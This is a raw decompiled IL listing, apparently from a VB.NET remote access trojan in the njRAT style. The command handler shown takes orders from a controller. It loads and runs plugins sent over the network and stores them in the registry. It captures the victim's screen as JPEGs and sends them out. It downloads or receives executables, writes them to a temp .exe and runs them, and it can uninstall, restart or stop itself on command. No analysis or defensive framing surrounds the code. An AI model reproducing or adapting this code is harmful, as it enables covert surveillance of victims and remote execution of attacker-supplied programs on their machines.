      IL_1ede:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1ee3:  ldnull
      IL_1ee4:  ldstr      "osk"
      IL_1ee9:  ldc.i4.1
      IL_1eea:  newarr     [mscorlib]System.Object
      IL_1eef:  dup
      IL_1ef0:  ldc.i4.0
      IL_1ef1:  ldloc.0
      IL_1ef2:  ldc.i4.2
      IL_1ef3:  ldelem.ref
      IL_1ef4:  stelem.ref
      IL_1ef5:  ldnull
      IL_1ef6:  ldnull
      IL_1ef7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1efc:  ldloc.s    V_149
      IL_1efe:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1f03:  ldnull
      IL_1f04:  ldstr      "start"
      IL_1f09:  ldc.i4.0
      IL_1f0a:  newarr     [mscorlib]System.Object
      IL_1f0f:  ldnull
      IL_1f10:  ldnull
      IL_1f11:  ldnull
      IL_1f12:  ldc.i4.1
      IL_1f13:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_1f18:  pop
      IL_1f19:  br.s       IL_1f21

      IL_1f1b:  ldc.i4.1
      IL_1f1c:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_1f21:  ldsfld     bool j.OK::Cn
      IL_1f26:  ldc.i4.0
      IL_1f27:  ceq
      IL_1f29:  box        [mscorlib]System.Boolean
      IL_1f2e:  ldloc.s    V_149
      IL_1f30:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1f35:  ldnull
      IL_1f36:  ldstr      "Off"
      IL_1f3b:  ldc.i4.0
      IL_1f3c:  newarr     [mscorlib]System.Object
      IL_1f41:  ldnull
      IL_1f42:  ldnull
      IL_1f43:  ldnull
      IL_1f44:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_1f49:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1f4e:  ldc.i4.1
      IL_1f4f:  box        [mscorlib]System.Boolean
      IL_1f54:  ldc.i4.0
      IL_1f55:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_1f5a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1f5f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_1f64:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1f69:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_1f6e:  brfalse.s  IL_1f1b

      IL_1f70:  ldloc.s    V_149
      IL_1f72:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_1f77:  ldnull
      IL_1f78:  ldstr      "off"
      IL_1f7d:  ldc.i4.1
      IL_1f7e:  newarr     [mscorlib]System.Object
      IL_1f83:  dup
      IL_1f84:  ldc.i4.0
      IL_1f85:  ldc.i4.1
      IL_1f86:  box        [mscorlib]System.Boolean
      IL_1f8b:  stelem.ref
      IL_1f8c:  ldnull
      IL_1f8d:  ldnull
      IL_1f8e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_1f93:  leave      IL_2724

      IL_1f98:  ldloc.0
      IL_1f99:  ldc.i4.1
      IL_1f9a:  ldelem.ref
      IL_1f9b:  ldc.i4.0
      IL_1f9c:  newarr     [mscorlib]System.Byte
      IL_1fa1:  call       object j.OK::GTV(string,
                                            object)
      IL_1fa6:  castclass  uint8[]
      IL_1fab:  stloc.s    V_152
      IL_1fad:  ldloc.0
      IL_1fae:  ldc.i4.2
      IL_1faf:  ldelem.ref
      IL_1fb0:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_1fb5:  ldc.i4.s   10
      IL_1fb7:  clt
      IL_1fb9:  ldloc.s    V_152
      IL_1fbb:  ldlen
      IL_1fbc:  conv.i4
      IL_1fbd:  ldc.i4.0
      IL_1fbe:  ceq
      IL_1fc0:  and
      IL_1fc1:  brfalse.s  IL_2000

      IL_1fc3:  ldc.i4.5
      IL_1fc4:  newarr     [mscorlib]System.String
      IL_1fc9:  dup
      IL_1fca:  ldc.i4.0
      IL_1fcb:  ldstr      "pl"
      IL_1fd0:  stelem.ref
      IL_1fd1:  dup
      IL_1fd2:  ldc.i4.1
      IL_1fd3:  ldsfld     string j.OK::Y
      IL_1fd8:  stelem.ref
      IL_1fd9:  dup
      IL_1fda:  ldc.i4.2
      IL_1fdb:  ldloc.0
      IL_1fdc:  ldc.i4.1
      IL_1fdd:  ldelem.ref
      IL_1fde:  stelem.ref
      IL_1fdf:  dup
      IL_1fe0:  ldc.i4.3
      IL_1fe1:  ldsfld     string j.OK::Y
      IL_1fe6:  stelem.ref
      IL_1fe7:  dup
      IL_1fe8:  ldc.i4.4
      IL_1fe9:  ldc.i4.1
      IL_1fea:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_1fef:  stelem.ref
      IL_1ff0:  call       string [mscorlib]System.String::Concat(string[])
      IL_1ff5:  call       bool j.OK::Send(string)
      IL_1ffa:  pop
      IL_1ffb:  br         IL_2104

      IL_2000:  ldloc.0
      IL_2001:  ldc.i4.2
      IL_2002:  ldelem.ref
      IL_2003:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_2008:  ldc.i4.s   10
      IL_200a:  ble.s      IL_2054

      IL_200c:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_2011:  ldloc.0
      IL_2012:  ldc.i4.0
      IL_2013:  ldelem.ref
      IL_2014:  ldsfld     string j.OK::Y
      IL_2019:  ldloc.0
      IL_201a:  ldc.i4.1
      IL_201b:  ldelem.ref
      IL_201c:  ldsfld     string j.OK::Y
      IL_2021:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_2026:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_202b:  stloc.s    V_154
      IL_202d:  dup
      IL_202e:  ldarg.0
      IL_202f:  ldloc.s    V_154
      IL_2031:  ldarg.0
      IL_2032:  ldlen
      IL_2033:  conv.i4
      IL_2034:  ldloc.s    V_154
      IL_2036:  sub.ovf
      IL_2037:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_203c:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_2041:  call       uint8[] j.OK::ZIP(uint8[])
      IL_2046:  stloc.s    V_152
      IL_2048:  ldloc.0
      IL_2049:  ldc.i4.1
      IL_204a:  ldelem.ref
      IL_204b:  ldloc.s    V_152
      IL_204d:  ldc.i4.3
      IL_204e:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_2053:  pop
      IL_2054:  ldc.i4.5
      IL_2055:  newarr     [mscorlib]System.String
      IL_205a:  dup
      IL_205b:  ldc.i4.0
      IL_205c:  ldstr      "pl"
      IL_2061:  stelem.ref
      IL_2062:  dup
      IL_2063:  ldc.i4.1
      IL_2064:  ldsfld     string j.OK::Y
      IL_2069:  stelem.ref
      IL_206a:  dup
      IL_206b:  ldc.i4.2
      IL_206c:  ldloc.0
      IL_206d:  ldc.i4.1
      IL_206e:  ldelem.ref
      IL_206f:  stelem.ref
      IL_2070:  dup
      IL_2071:  ldc.i4.3
      IL_2072:  ldsfld     string j.OK::Y
      IL_2077:  stelem.ref
      IL_2078:  dup
      IL_2079:  ldc.i4.4
      IL_207a:  ldc.i4.0
      IL_207b:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_2080:  stelem.ref
      IL_2081:  call       string [mscorlib]System.String::Concat(string[])
      IL_2086:  call       bool j.OK::Send(string)
      IL_208b:  pop
      IL_208c:  ldloc.s    V_152
      IL_208e:  ldstr      "A"
      IL_2093:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_2098:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_209d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_20a2:  stloc.s    V_153
      IL_20a4:  ldc.i4.5
      IL_20a5:  newarr     [mscorlib]System.String
      IL_20aa:  dup
      IL_20ab:  ldc.i4.0
      IL_20ac:  ldstr      "ret"
      IL_20b1:  stelem.ref
      IL_20b2:  dup
      IL_20b3:  ldc.i4.1
      IL_20b4:  ldsfld     string j.OK::Y
      IL_20b9:  stelem.ref
      IL_20ba:  dup
      IL_20bb:  ldc.i4.2
      IL_20bc:  ldloc.0
      IL_20bd:  ldc.i4.1
      IL_20be:  ldelem.ref
      IL_20bf:  stelem.ref
      IL_20c0:  dup
      IL_20c1:  ldc.i4.3
      IL_20c2:  ldsfld     string j.OK::Y
      IL_20c7:  stelem.ref
      IL_20c8:  dup
      IL_20c9:  ldc.i4.4
      IL_20ca:  ldloc.s    V_153
      IL_20cc:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_20d1:  ldnull
      IL_20d2:  ldstr      "GT"
      IL_20d7:  ldc.i4.0
      IL_20d8:  newarr     [mscorlib]System.Object
      IL_20dd:  ldnull
      IL_20de:  ldnull
      IL_20df:  ldnull
      IL_20e0:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_20e5:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_20ea:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_20ef:  stloc.s    V_155
      IL_20f1:  ldloca.s   V_155
      IL_20f3:  call       string j.OK::ENB(string&)
      IL_20f8:  stelem.ref
      IL_20f9:  call       string [mscorlib]System.String::Concat(string[])
      IL_20fe:  call       bool j.OK::Send(string)
      IL_2103:  pop
      IL_2104:  leave      IL_2724

      IL_2109:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_210e:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_2113:  stloc.s    V_156
      IL_2115:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_211a:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_211f:  stloc.s    V_21
      IL_2121:  ldloca.s   V_21
      IL_2123:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_2128:  ldloca.s   V_156
      IL_212a:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_212f:  ldc.i4     0x21005
      IL_2134:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32,
                                                                                      valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
      IL_2139:  stloc.s    V_157
      IL_213b:  ldloc.s    V_157
      IL_213d:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_2142:  stloc.s    V_158
      IL_2144:  ldloc.s    V_157
      IL_2146:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_214b:  ldloc.s    V_157
      IL_214d:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_2152:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_2157:  stloc.s    V_159
      IL_2159:  ldloc.s    V_158
      IL_215b:  ldc.i4.0
      IL_215c:  ldc.i4.0
      IL_215d:  ldc.i4.0
      IL_215e:  ldc.i4.0
      IL_215f:  ldloc.s    V_159
      IL_2161:  ldc.i4     0xcc0020
      IL_2166:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      .try
      {
        IL_216b:  ldc.i4.s   32
        IL_216d:  ldc.i4.s   32
        IL_216f:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_2174:  stloc.s    V_159
        IL_2176:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_217b:  ldloc.s    V_159
        IL_217d:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_2182:  stloc.s    V_156
        IL_2184:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_2189:  ldloc.s    V_158
        IL_218b:  ldloc.s    V_156
        IL_218d:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_2192:  leave.s    IL_21af

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_2194:  dup
        IL_2195:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_219a:  stloc.s    V_164
        IL_219c:  ldloc.s    V_164
        IL_219e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_21a3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_21a8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_21ad:  leave.s    IL_21af

      }  // end handler
      IL_21af:  ldloc.s    V_158
      IL_21b1:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_21b6:  ldloc.0
      IL_21b7:  ldc.i4.1
      IL_21b8:  ldelem.ref
      IL_21b9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_21be:  ldloc.0
      IL_21bf:  ldc.i4.2
      IL_21c0:  ldelem.ref
      IL_21c1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_21c6:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_21cb:  stloc.s    V_160
      IL_21cd:  ldloc.s    V_160
      IL_21cf:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_21d4:  stloc.s    V_158
      IL_21d6:  ldloc.s    V_158
      IL_21d8:  ldloc.s    V_157
      IL_21da:  ldc.i4.0
      IL_21db:  ldc.i4.0
      IL_21dc:  ldloc.s    V_160
      IL_21de:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_21e3:  ldloc.s    V_160
      IL_21e5:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_21ea:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawImage(class [System.Drawing]System.Drawing.Image,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32)
      IL_21ef:  ldloc.s    V_158
      IL_21f1:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_21f6:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_21fb:  stloc.s    V_161
      IL_21fd:  ldstr      "CAP"
      IL_2202:  ldsfld     string j.OK::Y
      IL_2207:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_220c:  stloc.s    V_155
      IL_220e:  ldloca.s   V_155
      IL_2210:  call       uint8[] j.OK::SB(string&)
      IL_2215:  starg.s    b
      IL_2217:  ldloc.s    V_161
      IL_2219:  ldarg.0
      IL_221a:  ldc.i4.0
      IL_221b:  ldarg.0
      IL_221c:  ldlen
      IL_221d:  conv.i4
      IL_221e:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_2223:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_2228:  stloc.s    V_162
      IL_222a:  ldloc.s    V_160
      IL_222c:  ldloc.s    V_162
      IL_222e:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
      IL_2233:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageFormat)
      IL_2238:  ldloc.s    V_162
      IL_223a:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_223f:  call       string j.OK::md5(uint8[])
      IL_2244:  stloc.s    V_163
      IL_2246:  ldloc.s    V_163
      IL_2248:  ldsfld     string j.OK::lastcap
      IL_224d:  ldc.i4.0
      IL_224e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_2253:  brfalse.s  IL_2275

      IL_2255:  ldloc.s    V_163
      IL_2257:  stsfld     string j.OK::lastcap
      IL_225c:  ldloc.s    V_161
      IL_225e:  ldloc.s    V_162
      IL_2260:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_2265:  ldc.i4.0
      IL_2266:  ldloc.s    V_162
      IL_2268:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_226d:  conv.ovf.i4
      IL_226e:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_2273:  br.s       IL_227d

      IL_2275:  ldloc.s    V_161
      IL_2277:  ldc.i4.0
      IL_2278:  callvirt   instance void [mscorlib]System.IO.MemoryStream::WriteByte(uint8)
      IL_227d:  ldloc.s    V_161
      IL_227f:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_2284:  call       bool j.OK::Sendb(uint8[])
      IL_2289:  pop
      IL_228a:  ldloc.s    V_161
      IL_228c:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_2291:  ldloc.s    V_162
      IL_2293:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_2298:  ldloc.s    V_157
      IL_229a:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_229f:  ldloc.s    V_160
      IL_22a1:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_22a6:  leave      IL_2724

      IL_22ab:  ldloc.0
      IL_22ac:  ldc.i4.1
      IL_22ad:  ldelem.ref
      IL_22ae:  stloc.s    V_155
      IL_22b0:  ldloc.s    V_155
      IL_22b2:  ldstr      "~"
      IL_22b7:  ldc.i4.0
      IL_22b8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_22bd:  brfalse.s  IL_22df

      IL_22bf:  ldloc.s    V_155
      IL_22c1:  ldstr      "!"
      IL_22c6:  ldc.i4.0
      IL_22c7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_22cc:  brfalse.s  IL_22e6

      IL_22ce:  ldloc.s    V_155
      IL_22d0:  ldstr      "@"
      IL_22d5:  ldc.i4.0
      IL_22d6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_22db:  brfalse.s  IL_22f3

      IL_22dd:  br.s       IL_230e

      IL_22df:  call       void j.OK::UNS()
      IL_22e4:  br.s       IL_230e

      IL_22e6:  ldc.i4.0
      IL_22e7:  call       void j.OK::pr(int32)
      IL_22ec:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_22f1:  br.s       IL_230e

      IL_22f3:  ldc.i4.0
      IL_22f4:  call       void j.OK::pr(int32)
      IL_22f9:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_22fe:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_2303:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_2308:  pop
      IL_2309:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_230e:  leave      IL_2724

      IL_2313:  ldloc.2
      IL_2314:  ldstr      "up"
      IL_2319:  ldc.i4.0
      IL_231a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_231f:  brtrue     IL_24dc

      IL_2324:  ldnull
      IL_2325:  stloc.s    V_6
      IL_2327:  ldloc.0
      IL_2328:  ldc.i4.1
      IL_2329:  ldelem.ref
      IL_232a:  ldc.i4.0
      IL_232b:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_2330:  ldc.i4.s   31
      IL_2332:  bne.un.s   IL_23b0

      .try
      {
        IL_2334:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_2339:  ldloc.0
        IL_233a:  ldc.i4.0
        IL_233b:  ldelem.ref
        IL_233c:  ldsfld     string j.OK::Y
        IL_2341:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_2346:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_234b:  stloc.s    V_165
        IL_234d:  dup
        IL_234e:  ldarg.0
        IL_234f:  ldloc.s    V_165
        IL_2351:  ldarg.0
        IL_2352:  ldlen
        IL_2353:  conv.i4
        IL_2354:  ldloc.s    V_165
        IL_2356:  sub.ovf
        IL_2357:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_235c:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_2361:  call       uint8[] j.OK::ZIP(uint8[])
        IL_2366:  stloc.s    V_6
        IL_2368:  leave      IL_2408

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_236d:  dup
        IL_236e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2373:  stloc.s    V_166
        IL_2375:  ldloc.s    V_166
        IL_2377:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_237c:  ldstr      "MSG"
        IL_2381:  ldsfld     string j.OK::Y
        IL_2386:  ldstr      "Update ERROR"
        IL_238b:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_2390:  call       bool j.OK::Send(string)
        IL_2395:  pop
        IL_2396:  ldstr      "bla"
        IL_239b:  call       bool j.OK::Send(string)
        IL_23a0:  pop
        IL_23a1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_23a6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_23ab:  leave      IL_2724

      }  // end handler
      IL_23b0:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_23b5:  stloc.s    V_7
      .try
      {
        IL_23b7:  ldloc.s    V_7
        IL_23b9:  ldloc.0
        IL_23ba:  ldc.i4.1
        IL_23bb:  ldelem.ref
        IL_23bc:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_23c1:  stloc.s    V_6
        IL_23c3:  leave.s    IL_2408

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_23c5:  dup
        IL_23c6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_23cb:  stloc.s    V_167
        IL_23cd:  ldloc.s    V_167
        IL_23cf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_23d4:  ldstr      "MSG"
        IL_23d9:  ldsfld     string j.OK::Y
        IL_23de:  ldstr      "Update ERROR"
        IL_23e3:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_23e8:  call       bool j.OK::Send(string)
        IL_23ed:  pop
        IL_23ee:  ldstr      "bla"
        IL_23f3:  call       bool j.OK::Send(string)
        IL_23f8:  pop
        IL_23f9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_23fe:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_2403:  leave      IL_2724

      }  // end handler
      IL_2408:  ldstr      "bla"
      IL_240d:  call       bool j.OK::Send(string)
      IL_2412:  pop
      IL_2413:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_2418:  call       valuetype [mscorlib]System.Guid [mscorlib]System.Guid::NewGuid()
      IL_241d:  stloc.s    V_145
      IL_241f:  ldloca.s   V_145
      IL_2421:  constrained. [mscorlib]System.Guid
      IL_2427:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_242c:  ldstr      "-"
      IL_2431:  ldstr      ""
      IL_2436:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_243b:  ldstr      ".exe"
      IL_2440:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_2445:  stloc.s    V_8
      .try
      {
        IL_2447:  ldstr      "MSG"
        IL_244c:  ldsfld     string j.OK::Y
        IL_2451:  ldstr      "Updating To "
        IL_2456:  ldloc.s    V_8
        IL_2458:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_245d:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_2462:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_2467:  call       bool j.OK::Send(string)
        IL_246c:  pop
        IL_246d:  ldc.i4     0x7d0
        IL_2472:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_2477:  ldloc.s    V_8
        IL_2479:  ldloc.s    V_6
        IL_247b:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_2480:  ldloc.s    V_8
        IL_2482:  ldstr      ".."
        IL_2487:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                                string)
        IL_248c:  pop
        IL_248d:  leave.s    IL_24d2

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_248f:  dup
        IL_2490:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_2495:  stloc.s    V_168
        IL_2497:  ldloc.s    V_168
        IL_2499:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_249e:  ldloc.s    V_168
        IL_24a0:  stloc.s    V_169
        IL_24a2:  ldstr      "MSG"
        IL_24a7:  ldsfld     string j.OK::Y
        IL_24ac:  ldstr      "Update ERROR "
        IL_24b1:  ldloc.s    V_169
        IL_24b3:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_24b8:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_24bd:  call       bool j.OK::Send(string)
        IL_24c2:  pop
        IL_24c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_24c8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_24cd:  leave      IL_2724

      }  // end handler
